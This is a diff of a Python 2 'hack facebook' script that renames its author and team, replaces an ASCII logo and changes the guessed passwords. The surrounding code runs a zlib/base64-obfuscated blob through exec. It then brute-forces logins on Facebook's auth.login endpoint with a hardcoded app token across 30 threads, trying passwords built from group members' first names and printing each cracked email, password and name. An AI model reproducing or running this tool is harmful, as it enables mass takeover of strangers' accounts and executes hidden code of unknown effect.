@@ -2,17 +2,16 @@
 
 """
 * unang salah pakke da
-* Author : HALAK-HITA2
-* Youtube : https://www
+* Author : Eavick DEvista bintang alivea
+* Youtube : https://www.instagram.com/anam_eavick_821/
 -------------------------------------------------------
-* Goar : hack fb
-* Goarna sude : HALAK-HITA2 hack fb
-* dipature : na taon na salpu
-* Support : TEAM MONOLOCK
-* Mauliate tu : Team monoloc
+* Goar : hack facebook
+* Goarna sude : EFICK
+* dipature : jangan salah guna ye..
+* Support : BEATSTAR CYBERMAFIA
+* Mauliate tu : EFICK EFHIYE
 -------------------------------------------------------
-* baru dope diparsiajari.unang adong na mambully da.
-sotung hu tallik :)
+* Never be you loved? yourself?...
 """
 
 
@@ -54,16 +53,15 @@ def tik():
         sys.stdout.write('\r\033[31;1m[!] \x1b[1;92mTunggu Sebentar \x1b[1;97m' + animation[(i % len(animation))])
         sys.stdout.flush()
 
-logo = ________ ________  ______  __       __ __       __  ______  __    __  ______  __        ______   ______  __    __ 
-/        /        |/      \/  \     /  /  \     /  |/      \/  \  /  |/      \/  |      /      \ /      \/  |  /  |
-$$$$$$$$/$$$$$$$$//$$$$$$  $$  \   /$$ $$  \   /$$ /$$$$$$  $$  \ $$ /$$$$$$  $$ |     /$$$$$$  /$$$$$$  $$ | /$$/ 
-   $$ |  $$ |__   $$ |__$$ $$$  \ /$$$ $$$  \ /$$$ $$ |  $$ $$$  \$$ $$ |  $$ $$ |     $$ |  $$ $$ |  $$/$$ |/$$/  
-   $$ |  $$    |  $$    $$ $$$$  /$$$$ $$$$  /$$$$ $$ |  $$ $$$$  $$ $$ |  $$ $$ |     $$ |  $$ $$ |     $$  $$<   
-   $$ |  $$$$$/   $$$$$$$$ $$ $$ $$/$$ $$ $$ $$/$$ $$ |  $$ $$ $$ $$ $$ |  $$ $$ |     $$ |  $$ $$ |   __$$$$$  \  
-   $$ |  $$ |_____$$ |  $$ $$ |$$$/ $$ $$ |$$$/ $$ $$ \__$$ $$ |$$$$ $$ \__$$ $$ |_____$$ \__$$ $$ \__/  $$ |$$  \ 
-   $$ |  $$       $$ |  $$ $$ | $/  $$ $$ | $/  $$ $$    $$/$$ | $$$ $$    $$/$$       $$    $$/$$    $$/$$ | $$  |
-   $$/   $$$$$$$$/$$/   $$/$$/      $$/$$/      $$/ $$$$$$/ $$/   $$/ $$$$$$/ $$$$$$$$/ $$$$$$/  $$$$$$/ $$/   $$/ 
-
+logo = ________________________________________________________________
+_______________________________________________________________________
+        $$$$$$$$$        $$    $$       $$  $$  $$$$$$$  $$
+        $$              $$ $$   $$     $$   $$  $$       $$   $$
+        $$$$$          $$   $$   $$   $$    $$  $$       $$ $$
+        $$            $$  $  $$   $$ $$     $$  $$       $$$
+        $$$$$$$$$    $$       $$   $$       $$  $$$$$$$  $$  $$$
+-----------------------------------------------------------------------
+       
 #-> Ini Untuk Data Kamu
 exec(zlib.decompress(base64.b64decode("eJylkU9LAzEQxc8r+B1iL9mCTVergi09iZ7Eg+ipSsmms93Q/HOSta2f3uxut1oQRLwl897M5P2ygIIou1wCpv3x8VGSVB7QcA1kSqwDk9K6wMIm0FNCkfYZAl+k/drquPdri4u91a1/NgbcNrOTHFnrLENwfjwc5oqb1dXlxTnLsmwNeWl94M4xYfXwzipl14D+Lh/SZg5sBLhANIiSG/kB7Pnx/hbRYjvdoTSh92JestFodja5PtOzk1fyYImwxoAI0ppeY7Se+a0PoFOKmgywIF3Iye6+S9JsTVagKo5tlJhgXnARLG6Z9PMyaBXjP2EFO9WDiqvmhUWdGpxmXVddmFHQXCr6Gls6zgdyTbRRO7QHqql0Dtjomm+6fVWuZWgfV2H9mFhcQojntigLQj1/h8EC3qUASqQhUWyR7X8m0WCqtqHDjPBWgQ+etfdIz7ObPclv3Dvwv2H/K/cD8HUMUYJYORuXHab449yvqKA8/GPEJy5e+KY=")))
 
@@ -115,7 +113,7 @@ def pilih_hh2():
                     print logo
                     r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                     asw = json.loads(r.text)
-                    print '\033[31;1m[✓]\033[32;1m Groups\033[31;1m :\033[37;1m ' + asw['name']
+                    print '\033[31;1m[?]\033[32;1m Groups\033[31;1m :\033[37;1m ' + asw['name']
                 except KeyError:
                     print '\x1b[31;1m[!] \x1b[31;1mGroups Tidak Ditemukan'
                     raw_input('\n\x1b[1;91m[ \x1b[1;97mEnter Aja Gan \x1b[1;91m]')
@@ -174,7 +172,7 @@ def pilih_hh2():
                                 z = json.loads(x.text)
                                 print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass4+"\033[36;1m |\033[37;1m "+z['name']
                             else:
-                                pass5 = a['first_name'] + 'ganteng123'
+                                pass5 = a['first_name'] + 'eavick123'
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
@@ -182,7 +180,7 @@ def pilih_hh2():
                                     z = json.loads(x.text)
                                     print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass5+"\033[36;1m |\033[37;1m "+z['name']
                                 else:
-                                    pass6 = a['first_name'] + 'cantik123'
+                                    pass6 = a['first_name'] + 'efia123'
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
@@ -190,7 +188,7 @@ def pilih_hh2():
                                         z = json.loads(x.text)
                                         print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass6+"\033[36;1m |\033[37;1m "+z['name']
                                     else:
-                                        pass7 = 'doraemon'
+                                        pass7 = 'bloods'
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                         q = json.load(data)
                                         if 'access_token' in q:
@@ -198,7 +196,7 @@ def pilih_hh2():
                                             z = json.loads(x.text)
                                             print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass7+"\033[36;1m |\033[37;1m "+z['name']
                                         else:
-                                            pass8 = 'sayang'
+                                            pass8 = 'bebyh'
                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             q = json.load(data)
                                             if 'access_token' in q:
@@ -206,7 +204,7 @@ def pilih_hh2():
                                                 z = json.loads(x.text)
                                                 print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass8+"\033[36;1m |\033[37;1m "+z['name']
                                             else:
-                                                pass9 = 'kontol123'
+                                                pass9 = 'TKJ alyufi'
                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 q = json.load(data)
                                                 if 'access_token' in q:
@@ -218,7 +216,7 @@ def pilih_hh2():
     meq = ThreadPool(30)
     meq.map(main, id)
     print "\033[31;1m========================================================"
-    print "\033[32;1m[✓]\033[37;1m Done Ya Boss Q"
+    print "\033[32;1m[?]\033[37;1m Done my boss"
     os.system('rm -rf cookie')
     keluar()
 
